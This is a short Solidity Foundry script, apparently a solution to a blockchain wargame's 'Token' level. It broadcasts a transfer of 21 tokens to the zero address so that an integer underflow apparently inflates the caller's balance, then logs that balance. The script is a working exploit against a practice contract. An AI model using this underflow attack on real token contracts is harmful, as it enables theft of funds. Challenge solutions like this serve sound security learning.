// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Token} from "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenSolution is Script {
    Token public tokenContract =
        Token(payable(0x0Fc7baa273A7625Dba38f81d5a05631Bf6c5A803));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenContract.transfer(address(0), 21);
        console.log("My Balance : ", tokenContract.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}
